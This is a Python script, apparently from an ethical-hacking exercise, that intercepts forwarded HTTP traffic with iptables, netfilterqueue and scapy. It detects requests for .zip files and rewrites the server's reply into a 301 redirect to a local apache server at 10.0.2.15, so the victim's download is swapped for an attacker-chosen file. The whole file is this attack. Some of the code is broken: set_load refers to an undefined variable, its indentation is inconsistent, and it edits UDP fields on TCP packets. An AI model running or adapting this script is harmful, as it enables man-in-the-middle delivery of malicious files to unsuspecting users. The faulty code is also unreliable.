import os
import netfilterqueue as nfq
import sys
import argparse
import scapy.all as scapy

#http://apache.org/dyn/closer.cgi
#https://apache.mirrors.nublue.co.uk/accumulo/1.10.0/
def get_arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument("-t", "--test", dest='test', action='store_true', help='Changes Iptables rule to trap local packages. Use for development purposes.')
    options= parse.parse_args()
    return options

ack_list=[]

def set_load(packet,load):
    scapy_packet[scapy.raw].load=load
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum
        return packet


def packet_processor(packet):
    scapy_packet =scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print('>> HTTP request')
            if b'.zip' in scapy_packet[scapy.Raw].load:
                print(scapy_packet.show)
                print('>> Download started')
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport== 80:
            print('>> HTTP Response')
            if scapy_packet[scapy.TCP].seq in ack_list:
                print('>> Replacing file')
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                packet=set_load(scapy_packet,'HTTP/1.1 301 Moved Permanently\nLocation:http://10.0.2.15/')
                packet.set_payload(bytes(packet))
    packet.accept()

try:
    options=get_arguments()
    if options.test:
        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
        os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
    else:
        os.system("iptables -I Forward -j NFQUEUE --queue-num 0")
    os.system('service apache2 start')
    queue = nfq.NetfilterQueue()
    queue.bind(0, packet_processor)
    queue.run()
except KeyboardInterrupt:
    print('\nUser requested termination...flusing IP tables')
    os.system("iptables --flush")
    sys.exit()
